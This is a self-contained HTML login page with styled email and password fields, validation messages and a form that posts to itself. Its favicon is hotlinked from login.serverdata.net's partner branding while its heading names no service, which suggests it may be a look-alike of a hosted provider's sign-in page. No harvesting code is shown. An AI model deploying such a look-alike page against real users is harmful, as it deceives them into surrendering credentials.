<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Sign in to your account</title>
    <link rel="icon" type="image/x-icon" href="https://login.serverdata.net/user/Shared/Branding/partner_favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #0ea5e9 0%, #06b6d4 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-form-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 460px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 32px;
            color: #1e293b;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 2px solid #e2e8f0;
            border-radius: 6px;
            outline: none;
            transition: border-color 0.2s;
            background: white;
        }

        .form-input:focus {
            border-color: #0ea5e9;
        }

        .form-input::placeholder {
            color: #94a3b8;
        }

        .z-validation-input {
            margin-bottom: 20px;
        }

        .validation-invalid {
            border: 2px solid #0ea5e9 !important;
            outline: 1px solid #0ea5e9 !important;
        }

        .validation-wrapper {
            display: flex;
            align-items: center;
            margin-top: 8px;
            color: #0ea5e9;
            font-size: 14px;
        }

        .error-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            background: #0ea5e9;
            border-radius: 50%;
            position: relative;
            flex-shrink: 0;
        }

        .error-icon::before {
            content: '!';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-weight: bold;
            font-size: 12px;
        }

        .login-form-forget {
            text-align: right;
            margin-top: 12px;
        }

        .login-form-forget a {
            color: #0ea5e9;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
        }

        .login-form-forget a:hover {
            text-decoration: underline;
        }

        .btn-submit {
            width: 100%;
            padding: 14px 16px;
            background: #0ea5e9;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 24px;
        }

        .btn-submit:hover {
            background: #0284c7;
        }

        .btn-submit:active {
            background: #0369a1;
        }

        .mb0 {
            margin-bottom: 0;
        }

        .mt4 {
            margin-top: 8px;
        }

        .mt8 {
            margin-top: 16px;
        }

        .mb16 {
            margin-bottom: 32px;
        }

        .ng-hide {
            display: none;
        }
    </style>
</head>
<body>
    <main class="login-form-container">
        <h1>Please sign in to access this service</h1>
        <form method="post" id="loginForm" autocomplete="off">
            <div class="z-validation-input">
                <input
                    class="form-input validation-invalid"
                    id="login"
                    name="login"
                    type="text"
                    placeholder="Email"
                    required
                    autocomplete="off">
                <div class="validation-wrapper mt4">
                    <div class="error-icon"></div>
                    <div id="error-user-name-required">
                        Email required
                    </div>
                </div>
            </div>
            <div class="z-validation-input mb0">
                <input
                    class="form-input validation-invalid"
                    type="password"
                    id="password"
                    name="password"
                    placeholder="Password"
                    required
                    autocomplete="new-password">
                <div class="validation-wrapper mt4">
                    <div class="error-icon"></div>
                    <div id="error-password-required">
                        Password required
                    </div>
                </div>
            </div>
            <div class="validation-wrapper mt4 ng-hide" id="invalid-credentials">
                <div class="error-icon"></div>
                <div>
                    Email or password is incorrect
                </div>
            </div>
            <div class="mt8 mb16">
                <div class="login-form-forget">
                    <a href="#" id="forgot-password">
                        Forgot password?
                    </a>
                </div>
            </div>
            <button type="submit" class="btn-submit">
                Sign in
            </button>
        </form>
    </main>
</body>
</html>
